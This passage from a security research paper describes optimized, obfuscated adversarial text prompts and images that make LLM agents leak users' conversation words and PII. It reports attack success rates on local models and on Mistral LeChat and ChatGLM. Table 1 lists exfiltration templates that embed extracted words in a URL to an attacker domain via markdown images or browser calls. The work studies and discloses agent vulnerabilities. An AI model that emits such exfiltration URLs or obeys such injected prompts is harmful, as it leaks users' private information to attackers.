Let $c$ denote the conversation history, $q$ denote the text prompt at the current round, $v$ denote the adversarial image to optimize and $y$ denote the target. The loss for a single objective is $\mathcal{L}(v)=-\log P(y|[c;q],x)$. We create $D_{img}=\left\{(c^{(j)},y^{(j)})\right\}^{|\mathcal{D}_{img}|}$, a similar dataset to $D_{text}$. We additionally create a dataset $\mathcal{D}_{q}$ from which the text prompt at the current round of conversation $q$ is drawn. Since the user may not always ask image-related questions, $D_{q}$ contains a large set of related questions generated with GPT-4 and unrelated questions selected from the Alpaca dataset (Taori et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib47)). The related-unrelated questions are drawn with $85\%$ and $15\%$ probability, respectively. The drawn $q^{(j)}$ is then appended with the conversation history data for training. The final loss is:

| (4) |  | $\mathcal{L}(v)=\frac{1}{&#124;\mathcal{D}_{img}&#124;}\sum_{j}^{&#124;\mathcal{D}_{img}&#124;}-% \log P(y^{(j)}&#124;[c^{(j)};q^{(j)}],v).$ |  |

$v$ is in a continuous space, where gradient-based optimization methods can be directly applied to minimize Eq. ([4](https://arxiv.org/html/2410.14923v2#S4.E4 "In 4.2\. Visual Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")). We adopt Adam optimizer (Kingma and Ba, [2014](https://arxiv.org/html/2410.14923v2#bib.bib20)) in our implementation for acceleration and better results. Note that $v$ needs to be within the valid range of image representation. All the elements in $v$ is constrained in $[0,1)$. To satisfy the image validation constraint, we force to clip out-of-range values in $v$. This straightforward method is helpful since image data has a huge search space for optimization.

## 5\. Evaluation

Our experimental evaluation answers the following research questions on attack performance:

1.  (1)

    What kinds of attack objectives are achievable using our algorithms? We demonstrate two challenging attack objectives, information exfiltration and PII exfiltration on production-grade LLM agents including Mistral LeChat, ChatGLM, and a custom agent on top of Llama3.1-70B.

2.  (2)

    How well does our attack work on local open-weight models? Our attack invokes target tools correctly $>80\%$ of the time and exfiltrates information with around 80% precision in both information exfiltration and PII exfiltration settings across four different models (3 textual LLMs and one visual LLM) with various tool invocation syntax.

3.  (3)

    How well do these adversarial examples transfer to commercial LLM agent products based on these open-weight models (if there is one)? Our attack shows on-par performance to the local tests when transferred to Mistral LeChat and ChatGLM. We achieve as high as 70% and 80% exfiltration precision in information exfiltration and PII exfiltration setting respectively.

#### Attack Objective.

The attacker wants to violate the confidentiality and integrity of user data and resources that are connected to the agent. They will achieve this by forcing the agent to misuse tools. As discussed in Section [2.2](https://arxiv.org/html/2410.14923v2#S2.SS2 "2.2\. From LLMs to Agents ‣ 2\. Background ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"), an agent may use several types of tools that allow it to book hotels, execute code, read and send emails, manipulate a calendar, etc. We surveyed existing agents in the real world and determined that most of them usually have a tool to interact with URLs. Hence, to demonstrate the most general result possible, we decided to create adversarial examples that misuse the URL access tool. The other commonality among agents is that users have conversations with them, often involving private information (Mireshghallah et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib33)). Based on this observation, we create two attack objectives: (1) Information Exfiltration: the adversarial example forces the LLM agent into analyzing the user’s sensitive conversation, extracts salient non-stop and non-filler words and then use a URL access tool to leak that information to the attacker by visiting a specific URL which embeds these words in the path; (2) PII Exfiltration: the adversarial example forces the LLM agent into exfiltrating PII as well as some high-level context from the conversation using the Web access tool similarly. Note that in either case, we do not expect the attack can exfiltrate all information or PII, yet, exposing a fraction of them to the attacker is already an alarming signal. We observe that these objectives are more challenging than ones that indiscriminately book hotels or delete data for the following reasons:

*   •

    The attack is dynamic and depends on analyzing the user’s conversation. Each user’s conversation will have different types of PII and sensitive information. The adversarial example must learn to extract the relevant information from the conversation.

*   •

    The attack must produce a fully qualified, syntactically correct URL that contains the information exfiltrated from the user’s conversation, formatted as a URL path. This is strictly harder than an attack that generates a fixed tool usage command that is independent of the user’s conversation.

The above reasons also explain why our obfuscated adversarial examples are qualitatively different from other optimization-based attacks on LLMs, such as jailbreaking.

Table 1. The target invocation syntax for each LLM agent to be used in our evaluation. \mintinline[]text¡Any¿ represents that there is no requirements on this and could be any characters. \mintinline[]text¡payload¿ represents the extracted words from the conversation. \mintinline[]textvelocity.show is the attacker-specified domain name.

| LLM Agent | Tool | Target Invocation Syntax |
| LeChat | Markdown Image | \mintinline[breaklines]markdown![¡Any¿](https://velocity.show/¡payload¿) |
| ChatGLM |
| ChatGLM | Browser | \mintinline[breaklines]pythonsimple_browser(velocity.show/¡payload¿) |
| Custom Llama Agent | Browser | \mintinline[breaklines,escapeinside=##]xml¡function#=browse#¿”addr”:”velocity.show/#¡payload¿#”¡/function¿ |

#### Choice of Target LLMs and Agents.

Our attack setup needs the target LLM agent to have the following properties: (1) Open weights for an LLM in the same family as the actual product; (2) General-purpose Web access tool such as a URL fetcher or markdown image rendering support; (3) LLM must fit in our GPU resources (intermittent access to 3x NVIDIA A100 80G and 2x NVIDIA A6000). The following commercial agents meet these criteria: Mistral’s LeChat and ChatGLM. We do not know the weights of the specific models being used in these agents, but it is reasonable to deduce that they are not too different from the open-weight releases — Mistral-Nemo-0714 (12B) (Team, [2024](https://arxiv.org/html/2410.14923v2#bib.bib50)) and GLM-4-9B (GLM et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib8)). We also experiment with Llama-3.1-70B, as it is one of the best open weights models currently (Fourrier et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib6)). While there is an agent based on this model (meta.ai), it does not support any general-purpose URL access tools.⁶⁶6The runtime environment removes any generated URL. However, we believe it is important to demonstrate results on this large open-weight model as well, so we built a custom agent using the llama-stack-apps framework⁷⁷7https://github.com/meta-llama/llama-stack-apps that has access to a general-purpose URL fetcher. These three agents are text-only.

We also demonstrate results on text-image LLM agents. Unfortunately, we did not find a commercial agent that meets all our criteria above. Therefore, we conduct local experiments on an agent that we created using the PaliGemma-3B model, the latest visual LLM from Google (Beyer et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib4)).

Table [1](https://arxiv.org/html/2410.14923v2#S5.T1 "Table 1 ‣ Attack Objective. ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") presents the syntax for tool invocations for all attacks on all the models and agents discussed above. \mintinline[breaklines]textvelocity.show is the attacker-specified domain name we use across this paper. It was intentionally chosen to be irregular and non-URL looking. To ensure the URL is valid and can be correctly interpreted by the LLM agent, we require extracted terms in the <payload> to be separated by $/$ to form a path (as seen in Figure [1](https://arxiv.org/html/2410.14923v2#S1.F1 "Figure 1 ‣ 1\. Introduction ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")), or by $+$ to form a query (with ?q= pre-pended).

### 5.1\. Information Exfiltration Attack

The adversarial examples in this attack analyze the user’s conversation to pick out non-stop and non-filler words, encode them as a valid URL and then makes the agent use a Web access tool to exfiltrate the extracted words to the attacker’s server. We construct the attack on Mistral-Nemo-0714, GLM-4-9B and Llama3.1-70B using the algorithm outlined earlier. We then test transferability to LeChat and ChatGLM. We note that there is no transferability test for Llama, because we built a custom agent directly on top of Llama.

#### Training Dataset Construction.

The training dataset ($\mathcal{D}_{text}$) of our optimization in this case must capture the concept of non-stop and non-filler words from real-world conversations between humans and agents. It must also capture the concept of extracting words that communicate information about the conversation, i.e., the extracted words should be salient.

We used the ShareGPT conversation dataset to acquire conversation examples⁸⁸8[https://huggingface.co/datasets/anon8231489123/ShareGPT_Vicuna_unfiltered](https://huggingface.co/datasets/anon8231489123/ShareGPT_Vicuna_unfiltered). This dataset contains nearly 53k conversations between humans and ChatGPT 3.5 in late 2022 and early 2023\. We sampled the first 100 conversations in the dataset, excluding obvious low-quality conversations such as ”Hello!”, ”Hi I’m GPT”.

We then used the LLM under attack to generate the salient words to be extracted. We prompted the LLM using the following: “Extract a couple of keywords from the above conversation. Print them with comma delimiter and nothing else. \n\Output:\n”. We observe that this is a valid choice for the following reasons: (1) Production-level LLMs, such as the ones we attack, have demonstrated strong capacity in text understanding and summarization (GLM et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib8); Dubey et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib5); Jin et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib18)); (2) It is more efficient to teach the adversarial example the concept of salient words in a conversation using the model’s own internal interpretation. Finally, we constructed correct tool invocations for these dataset items according to Table [1](https://arxiv.org/html/2410.14923v2#S5.T1 "Table 1 ‣ Attack Objective. ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").

The training dataset construction for the visual model PaliGemma-3B followed the same procedure above, except that, instead of using it to extract salient words from the conversation, we used the ones generated by Llama3.1-70B since PaliGemma is limited in its capability due to its relatively small model size (3B).

Table 2. Information Exfiltration Attack. Local evaluation results under different attack settings. ID is the identifier of the adversarial prompt. $\downarrow$ indicates the change from the initial to the adversarial prompt. Note that Extrac. Prec. are computed only on syntax-correct cases and are not comparable across rows when syntax correct rates show significant differences.

 {tblr} colspec=Q[c,0.6cm]Q[c,0.6cm]Q[c]Q[c,4.7cm]Q[c,4.7cm]Q[c]Q[c]Q[c]Q[c]Q[c], rowspec=Q[m], hline1,Z = 1pt, belowsep = 0pt, abovesep = 1.5pt, \SetCell[c=2]c Attack
Settings & ID Initial Prompt Adversarial Prompt PPL Syntax
Correct % Extrac.
Prec. % Extrac.
GPT % Time
h
\SetCell[r=4,c=2]c Mistral
Nemo
MD Img \SetCell[r=2]c T1 \SetCell[r=2]l,m ![[Uncaptioned image]](img/00141fd498ef792cb0ccc2b6c8ff2ab0.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/fcd2710009508b3cb0fee8d07128d676.png) \SetCell[r=2]c 348
$\downarrow$
5413 \SetCell[r=2]c 73.0
$\downarrow$
90.0 \SetCell[r=2]c 87.2 \SetCell[r=2]c 83.7 \SetCell[r=2]c 27

\SetCell[r=2]c T2 \SetCell[r=2]l,m ![[Uncaptioned image]](img/87dab1f7f67046c44e96462e897de24f.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/866845240c760d7a7950cc46ae64a704.png) \SetCell[r=2]c 254
$\downarrow$
4713 \SetCell[r=2]c 64.3
$\downarrow$
89.7 \SetCell[r=2]c 86.0 \SetCell[r=2]c 76.7 \SetCell[r=2]c 23

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N1 \SetCell[r=2,c=2]l,m,9.6cm ![[Uncaptioned image]](img/2ae3f2782d1c05e4ab5ee979b4b0664e.png) \SetCell[r=2]c,m \SetCell[r=2]c 260 \SetCell[r=2]c 86 \SetCell[r=2]c 86.1 \SetCell[r=2]c 38.3 \SetCell[r=2]c -

\SetCell[r=2,c=2]c GLM-4
Browser
(Query) \SetCell[r=2]c T3 \SetCell[r=2]l,m ![[Uncaptioned image]](img/1846adcb0e26193007797e9eeef1baae.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/c936c363f17fcbcb161c2edac0efc608.png) \SetCell[r=2]c 267
$\downarrow$
39211 \SetCell[r=2]c 5.7
$\downarrow$
92.4 \SetCell[r=2]c 85.6 \SetCell[r=2]c 91.5 \SetCell[r=2]c 15

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N2 \SetCell[r=2,c=2]l,m,9.6cm ![[Uncaptioned image]](img/fa3d699061965347cf63b290252f0653.png) \SetCell[r=2]c,m \SetCell[r=2]c 281 \SetCell[r=2]c 32.3 \SetCell[r=2]c 6.0 \SetCell[r=2]c 0 \SetCell[r=2]c -

\SetCell[r=2,c=2]c GLM-4
Browser
(Path) \SetCell[r=2]c T4 \SetCell[r=2]l,m ![[Uncaptioned image]](img/9b8bceb4d1ca5b8946411e2212df6258.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/ef6010cf830f32975bbc464d4e5b9e4e.png) \SetCell[r=2]c 332
$\downarrow$
13168 \SetCell[r=2]c 45.6
$\downarrow$
87.0 \SetCell[r=2]c 83.4 \SetCell[r=2]c 73.0 \SetCell[r=2]c 21

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N3 \SetCell[r=2,c=2]l,m,9.6cm ![[Uncaptioned image]](img/a32241dad5db0962286d6e00d2af2f21.png) \SetCell[r=2]c,m \SetCell[r=2]c 281 \SetCell[r=2]c 63.6 \SetCell[r=2]c 48.3 \SetCell[r=2]c 40.0 \SetCell[r=2]c -

\SetCell[r=4,c=2]c GLM-4
MD Img \SetCell[r=2]c T5 \SetCell[r=2]l,m ![[Uncaptioned image]](img/21240878a714c90e69415a320fc8505b.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/2919701d5ae03c8f5573e5552657f8db.png) \SetCell[r=2]c 98
$\downarrow$
8009 \SetCell[r=2]c 0
$\downarrow$
95.3 \SetCell[r=2]c 77.5 \SetCell[r=2]c 84.0 \SetCell[r=2]c 21

\SetCell[r=2]c T6 \SetCell[r=2]l,m ![[Uncaptioned image]](img/d73330624bd955683cbeae0ed75f14b3.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/56d7b0271db87cda8ab0cba719187eb7.png) \SetCell[r=2]c 127
$\downarrow$
11264 \SetCell[r=2]c 0
$\downarrow$
84.0 \SetCell[r=2]c 85.6 \SetCell[r=2]c 74 \SetCell[r=2]c 16

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N4 \SetCell[r=2,c=2]l,m,9.6cm ![[Uncaptioned image]](img/cbaf4f7788cfc1bdfba2b3bcf3b494eb.png) \SetCell[r=2]c,m \SetCell[r=2]c 117 \SetCell[r=2]c 0 \SetCell[r=2]c 0 \SetCell[r=2]c 0 \SetCell[r=2]c -

\SetCell[r=4,c=2]c Llama3.1
Browser \SetCell[r=2]c T7 \SetCell[r=2]l,m ![[Uncaptioned image]](img/ff8e5e111f1271e0ac6880ee518b7e64.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/944f89730cbada4e04ae45f244c3e9e1.png) \SetCell[r=2]c 394
$\downarrow$
23323 \SetCell[r=2]c 72.7
$\downarrow$
79.0 \SetCell[r=2]c 90.0 \SetCell[r=2]c 75.0 \SetCell[r=2]c 27

\SetCell[r=2]c T8 \SetCell[r=2]l,m ![[Uncaptioned image]](img/f2b7f8a7660a2c0fd3869e1599d590d4.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/20403fd07fa45c80b898c79dee975ec0.png) \SetCell[r=2]c 31068
$\downarrow$
56927 \SetCell[r=2]c 2.7
$\downarrow$
81.6 \SetCell[r=2]c 89.4 \SetCell[r=2]c 78.3 \SetCell[r=2]c 6.1

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N5 \SetCell[r=2,c=2]l,m,9.6cm ![[Uncaptioned image]](img/75401ebec71ebaca9e34bb1baaa2129f.png) \SetCell[r=2]c,m \SetCell[r=2]c 616 \SetCell[r=2]c 72.3 \SetCell[r=2]c 92 \SetCell[r=2]c 70.7 \SetCell[r=2]c - 

#### Metrics.

We obtained 100 distinct conversations from the ShareGPT dataset (the last 100) as our validation set. We tested each adversarial example against these 100 conversations with 3 inference trials for each of them and evaluated the results with the following metrics, ordered by priority.

1.  (1)

    Syntax Correctness — whether the generation of the LLM contains a substring with the exact syntax required for the tool invocation. It is judged with a corresponding regex for each tool invocation syntax and reflects whether the attack would successfully invoke the target tool. It is therefore of the highest importance. We report the number of times that the adversarial example leads to a generation with the correct tool invocation syntax out of the 100 conversations.

2.  (2)

    Prompt Perplexity (PPL) — a measure of how well an LLM predicts the adversarial example. It is widely adopted as an indicator of how unnatural a text is (Shi et al., [2022](https://arxiv.org/html/2410.14923v2#bib.bib44); Martinc et al., [2021](https://arxiv.org/html/2410.14923v2#bib.bib29)). We use it as a reference for the obfuscation level of our adversarial text. As long as the prompt perplexity is significantly larger than their natural language counterparts, we conclude that the prompt is obfuscated. We compute the perplexity with the largest LLM that fits in our environment i.e., Llama3.1 70B. On this model specifically, a regular natural language text gives a perplexity of fewer than 10 (Dubey et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib5)).

3.  (3)

    Word Extraction Precision — when the syntax is correct, the ratio of extracted words that also appear in the conversation. It deterministically measures how well the extraction captures original words from the conversation. We apply Porter stemmer (Porter, [2001](https://arxiv.org/html/2410.14923v2#bib.bib38)) on both the conversation and the extracted words to eliminate the case where variants of the same words are presented (e.g., run and ran) and remove any stop and filler words before the computation. Since Porter Stemmer doesn’t always successfully stem words of the same meaning into an identical root vocabulary e.g., irritation and irritated will be stemmed as irrat and irratat respectively, this statistic infers a lower bound of the actual performance. We report the final aggregated ratio across conversations in the validation dataset.

4.  (4)

    Word Extraction GPT Score — when the syntax is correct, this measures whether GPT-4-o believes the payload captures any salient information from the conversation. (The answer is always False when the syntax is incorrect.) We incorporate this metric considering that semantically similar but syntactically different words extracted from the conversation (e.g., financing vs. banking) will decrease the precision score. We report the number of times where GPT returns True out of the 100 conversations. Note that even though GPT-4-o is widely adopted as a judge for semantics tasks like this and performs well (Zheng et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib58)), we find it unreliable due to its uncertainty and view it as a secondary reference in addition to the above precision score. The prompt is provided in Appendix [A.2](https://arxiv.org/html/2410.14923v2#A1.SS2 "A.2\. Prompt List ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").

Note that all the numbers reported are averaged across the three inference trials to reflect the average-case performance of our adversarial examples. We also emphasize that word extraction precision is computed on successful tool invocations only (i.e., when the syntax is correct).

#### Results on local Text LLMs.

We executed our optimization method on the training dataset we obtained with various combinations of optimization parameters i.e., initial prompts, vocabulary mask, syntax-correctness loss weight $\lambda$, proposal number $p$, and subset size $s$ ($N$ and $k$ are fixed to be 10 and 256 respectively). For the smaller model Mistral Nemo and GLM-4, our attack fits in one single NVIDIA A6000 48GB. As for Llama3.1 70B, our attack requires three NVIDIA A100 80GB. The optimization mostly takes fewer than 24 hours under each setting. We then test the obtained adversarial examples on the validation set. We present two optimization settings as well as the best-performing prompt (out of $N$=10) obtained in each setting, for five different attack targets (i.e., target model and tool) in Table [5.1](https://arxiv.org/html/2410.14923v2#S5.SS1.SSS0.Px1 "Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") along with the evaluation results. For brevity, we put the optimization parameters other than initial prompts for each of them in Appendix [A.1](https://arxiv.org/html/2410.14923v2#A1.SS1 "A.1\. Optimization Parameters ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). Presenting two settings per target aims to demonstrate the versatility and non-isolating nature of the attack’s success. Observe that we manually inserted ! in the natural language instructions as the initialization to increase the total tokens and deviate them from pure natural language (Section [4.1](https://arxiv.org/html/2410.14923v2#S4.SS1.SSS0.Px3 "Obfuscation. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")).

Our adversarial examples effectively exfiltrate information on local text LLMs. We can see that each presented adversarial example achieves at least 80 percent of syntax correctness rate on average, with the best one within the same attack setting mostly higher than or close to 90%, while maintaining a high perplexity score and being obfuscated to humans. Such success rates suggest the reliability of our attack on local models. Moreover, the Word Extraction Precision and Word Extraction GPT Score are always at around 80%. These tell that the attack is highly effective in extracting salient information.

Our optimization method works and generalizes well. Observe that our optimization method works consistently under three different target tool invocation syntaxes (Table [1](https://arxiv.org/html/2410.14923v2#S5.T1 "Table 1 ‣ Attack Objective. ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")) across three production-level text LLMs of various scales (9B, 12B, and 70B parameters) — we observe a consistently significant improvement in syntax success rate and perplexity compared to the natural language instructions and initial prompts. Though we cannot exhaust all possible combinations, these results show evidence that our attack could generalize to other models and other target tool invocation texts (especially the less challenging ones with fixed syntax we mentioned earlier).

#### Results on Real Products.

To show the effectiveness of our attack on real-world LLM agents, we transferred the best-performing adversarial text prompts obtained in local evaluations i.e., prompt T1 and T5 to the corresponding LLM agent products, Mistral LeChat Nemo and ChatGLM. In both cases, we were targeting the markdown image rendering tool.

We utilized the Selenium browser automation toolkit to interact with the web interface of Mistral LeChat and ChatGLM and collect the response from the agent automatically. Both products have a daily quota limit of around 35 conversations in our validation dataset. So it was impractical to have three trials of inferences as we did in the local LLM evaluations. We only ran one single inference for each example and reported all the results in Table [3](https://arxiv.org/html/2410.14923v2#S5.T3 "Table 3 ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") based on this one-shot attempt. Since 2 conversations in the validation set were marked to be harmful in these real products, we removed them and thus we have 98 total conversations to be tested against.

Table 3\. Information Exfiltration Attack on Real Products. Evaluation results of best-performing (in the corresponding attack setting) adversarial prompts from Table [5.1](https://arxiv.org/html/2410.14923v2#S5.SS1.SSS0.Px1 "Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") and one another from Table [5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") on LeChat and ChatGLM compared to manual prompts.

 Agent ID Syntax Correct % Extrac. Prec. % Extrac. GPT % Mistral LeChat(Nemo) T1 84.7 70.1 66.3 T10 90.8 41.8 35.7 N1 59.1 52.4 39.8 ChatGLM T5 99.0 62.5 59.2 N4 93.8 83.6 87.7 

Our text adversarial examples do transfer to black-box real-world LLM agents. We can see that these two adversarial examples T1 and T5 still perform effectively in these two real-world LLM agents (T10 is discussed in the next section). The syntax correctness rate of T1 decreases slightly, while that of T5 increases. We see a slight decrease in the information extraction effectiveness on both prompts, but not significant. We believe this is because the agent responses in our training dataset are purely plaintexts but these modern agents frequently respond with syntax-rich contents such as code blocks, online research result blocks, and even AI-generated plots that are unseen in the training. Note that in both products, our optimized adversarial prompts show higher syntax correctness rates than manual prompts (N1 and N4), indicating the efficacy of the optimization process.

#### Results on Local Visual LLM.

We run the image optimization methods on 6 base images. The details about the base images and how they are chosen are shown in Appendix [A.3](https://arxiv.org/html/2410.14923v2#A1.SS3 "A.3\. Base Image for Image Attack ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). All of these images are pre-processed to 224x224 pixel size. We demonstrate the evaluation results in Table [4](https://arxiv.org/html/2410.14923v2#S5.T4 "Table 4 ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") and display the adversarial images in Figure [3](https://arxiv.org/html/2410.14923v2#S5.F3 "Figure 3 ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). The prompt perplexity does not apply to images. For completeness, we report the structural similarity (SSIM) (Wang et al., [2004](https://arxiv.org/html/2410.14923v2#bib.bib51)) to reflect the relative distortion between the adversarial images and the initial images.

Our attack also works effectively on the local visual LLM. In general, all six adversarial images show promising results. The syntax correctness is on par with the text adversarial images on local text models, ranging from 80% to 90%. The keyword extraction scores are slightly lower. This is not surprising considering that the targeted PaliGemma model is limited in its semantic understanding capability due to its smaller model size (3B parameters).

We also observe that it is particularly hard to note the noise added to V4 (Figure [2(d)](https://arxiv.org/html/2410.14923v2#S5.F2.sf4 "In Figure 3 ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")) because of the blurred background and the dotted frosting added to the donuts. This indicates that attackers can carefully choose the base image for optimization to reduce the chance that users recognize the added noise when necessary. However, achieving a higher SSIM is not the objective of our attack as images are intrinsically obfuscated in our context as mentioned in Figure [4.2](https://arxiv.org/html/2410.14923v2#S4.SS2 "4.2\. Visual Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). One may improve the similarity score by applying regularization terms to the loss function, at the potential cost of lower attack performance and longer optimization time (Fu et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib7)).

![Refer to caption](img/00ba8f7392a1867d344086a9b6c555e4.png)

((a)) V1

![Refer to caption](img/ce74d9e45c6f4de9e28513af2f866dbf.png)

((b)) V2

![Refer to caption](img/afad5a60af862dec411be323598ee56b.png)

((c)) V3

![Refer to caption](img/635944354bb130bd6893574d762e2228.png)

((d)) V4

![Refer to caption](img/bac97b309eab249b41b036b1cb6799b8.png)

((e)) V5

![Refer to caption](img/61d091bf3bfe44ee35368a01016f0d00.png)

((f)) V6

Figure 3. Adversarial images obtained after optimization.

Table 4. Information Exfiltration Attack. Local evaluation results of various visual adversarial examples on PaliGemma.

| # | SSIM | Syntax Correct % | Extrac. Prec. % | Extrac. GPT % |
| V1 | 0.665 | 87.8 | 84.3 | 78.4 |
| V2 | 0.780 | 83.6 | 73.0 | 62.6 |
| V3 | 0.640 | 82.6 | 80.7 | 61.2 |
| V4 | 0.785 | 83.0 | 80.9 | 65.8 |
| V5 | 0.783 | 82.0 | 86.3 | 69.8 |
| V6 | 0.583 | 83.4 | 79.1 | 63.0 |

### 5.2\. PII Exfiltration Attack

The adversarial examples in this attack, instead of picking out salient non-stopping and non-filler words as in the previous one, should pick out PII relevant words as well as some high-level context of the conversation and perform the same exfiltration. By PII we refer to the name, contacts (including phone, email, address, etc.), government IDs (e.g., passport number), and other information that can help identify a person. We define context as the information that suggests the subject of the conversation (e.g., the intention of the user and the matters that the user is involved in). We construct the attack on Mistral-Nemo-0714 and GLM4 and test the transferability to Mistral LeChat and ChatGLM respectively.

#### Dataset Construction.

The training dataset for PII extraction is created similarly based on another real-world human-LLM conversation dataset named WildChat collected in 2024 (Zhao et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib57)). Prior work has shown that people provide private information in conversations with LLM agents and has provided categorized annotations about the types of private information contained in conversations in WildChat (Mireshghallah et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib33)). Based on this, we manually find all 49 conversations under the category of ”Job, visa, and other applications” in WildChat that contain legit PII data (and replace redacted PII with fake ones). We then manually identify ground-truth PII for each conversation as well as the additional context on top of a draft extracted by GPT-4-o. We sampled 24 of them and constructed our training dataset, leaving the rest 25 as the validation dataset.

Table 5. PII Exfiltration Attack. Local evaluation results under various attack settings. $\downarrow$ indicates the change from the initial to the adversarial prompt. Note that we manually modified T9 as the initial prompt of T10\. Similarly, we set the initial prompts of T11 and T12 based on other failed attempts. Observe that this method effectively enhances the perplexity i.e., obfuscation level of the adversarial prompts (as mentioned in Section [4.1](https://arxiv.org/html/2410.14923v2#S4.SS1.SSS0.Px3 "Obfuscation. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")). Note that PII Prec. and PII Recall Rate are only computed on syntax-correct cases.

 {tblr} colspec=Q[c,0.7cm]Q[c,0.7cm]Q[c]Q[c,5cm]Q[c,5cm]Q[c]Q[c]Q[c]Q[c]Q[c]Q[c], rowspec=Q[m], hline1,Z = 1pt, \SetCell[c=2]c Attack
Settings & ID Initial Prompt Textual Adversarial Prompt PPL Syntax
Correct % PII
Prec. % PII
Recall % Context
GPT % Time
h
\SetCell[r=4,c=2]c Mistral
Nemo
